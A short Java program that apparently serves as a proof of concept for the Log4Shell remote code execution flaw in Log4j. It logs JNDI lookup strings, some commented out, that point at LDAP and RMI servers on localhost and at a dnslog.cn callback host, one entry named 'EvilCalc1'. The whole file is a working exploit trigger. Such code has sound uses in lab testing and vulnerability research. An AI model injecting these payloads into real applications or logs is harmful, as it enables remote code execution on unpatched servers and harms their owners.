import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4jRCE {

    private static final Logger logger = LogManager.getLogger(Log4jRCE.class);
    public static void main(String[] args) {
       // logger.error("${jndi:ldap://3xn3kc.dnslog.cn}");
//        logger.error("${jndi:ldap://127.0.0.1:1389/7jcins}");
//        logger.error("${jndi:rmi://127.0.0.1:1099/eouuae}");
//        logger.error("${jndi:rmi://127.0.0.1:1099/7jcins}");
//        logger.error("${jndi:rmi://127.0.0.1:1099/EvilCalc1}");
        logger.error("${jndi:ldap://127.0.0.1:1389/s7xm3g}");

    }
}
